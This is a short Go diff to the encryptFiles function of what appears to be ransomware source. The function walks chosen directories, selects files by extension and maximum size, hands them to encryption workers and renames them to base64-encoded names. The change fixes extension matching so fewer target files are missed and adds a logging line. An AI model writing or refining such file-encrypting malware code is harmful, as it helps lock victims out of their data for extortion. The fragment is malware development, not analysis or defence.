@@ -130,12 +130,13 @@ func encryptFiles() {
 		// Loop over the interesting directories
 		for _, folder := range cmd.InterestingDirs {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
-				ext := filepath.Ext(path)
+				ext := strings.ToLower(filepath.Ext(path))
 
 				// If the file is not a folder and have a size lower than the max specified
-				if !f.IsDir() && f.Size() <= cmd.MaxFileSize {
+				// The ext must have at least the dot and the extension letter(s)
+				if !f.IsDir() && f.Size() <= cmd.MaxFileSize && len(ext) >= 2 {
 					// Matching extensions
-					if utils.StringInSlice(strings.ToLower(ext[1:]), cmd.InterestingExtensions) {
+					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
 						// Each file is processed by a free worker on the pool
 						// Send the file to the MatchedFiles channel then workers
 						// can imediatelly proccess then
@@ -218,6 +219,7 @@ func encryptFiles() {
 	var listFilesEncrypted []string
 
 	// Rename the files after all have been encrypted
+	cmd.Logger.Println("Renaming files...")
 	for _, file := range FilesToRename.Files {
 		// Replace the file name by the base64 equivalent
 		newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
